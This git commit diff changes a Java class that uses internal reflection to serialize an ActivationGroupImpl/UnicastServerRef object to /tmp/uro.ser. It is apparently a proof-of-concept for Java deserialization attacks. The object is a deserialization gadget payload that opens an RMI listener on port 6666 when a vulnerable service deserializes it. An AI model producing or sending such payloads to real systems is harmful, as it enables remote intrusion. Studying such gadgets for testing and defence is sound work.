fa8cfcb2cb9114efcfc31db492530e28a99a2276
Jason Shepherd <jshepher@redhat.com>
2016-08-19 14:19:40 +1000

    serialization using reflection

--- UROSerialization/src/SerializeUROExample.java
+++ UROSerialization/src/SerializeUROExample.java
@@ -1,25 +1,31 @@
 import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
+import java.rmi.server.RemoteObject;
+import java.rmi.server.RemoteRef;
 import java.rmi.server.UnicastRemoteObject;
+
+import sun.reflect.ReflectionFactory;
+import sun.rmi.server.ActivationGroupImpl;
+import sun.rmi.server.UnicastServerRef;
+
 import java.lang.reflect.Constructor;
 import java.io.Serializable;
 
 public class SerializeUROExample {
 
     public static void main(String[] args) throws Exception {
-           FileOutputStream fileOut =
-           new FileOutputStream("/tmp/uro.ser");
-           ObjectOutputStream out =
-                   new ObjectOutputStream(fileOut);
-           out.writeObject(createObject(6666));
-           out.close();
-           fileOut.close();
+        FileOutputStream fileOut = new FileOutputStream("/tmp/uro.ser");
+        ObjectOutputStream out = new ObjectOutputStream(fileOut);
+        out.writeObject(createObject(6666));
+        out.close();
+        fileOut.close();
     }
 
-    public static Serializable createObject(int port) throws Exception{
-            Constructor<UnicastRemoteObject> constructor =
-                    UnicastRemoteObject.class.getDeclaredConstructor(int.class);
-            constructor.setAccessible(true);
-            return (UnicastRemoteObject) constructor.newInstance(port);
-     }
+    public static Object createObject(int port) throws Exception {
+        Constructor objCons = RemoteObject.class.getDeclaredConstructor(new Class[] { RemoteRef.class });
+        Constructor serializationConstructor = ReflectionFactory.getReflectionFactory()
+                .newConstructorForSerialization(ActivationGroupImpl.class, objCons);
+        serializationConstructor.setAccessible(true);
+        return serializationConstructor.newInstance(new Object[] { new UnicastServerRef(port) });
+    }
 }
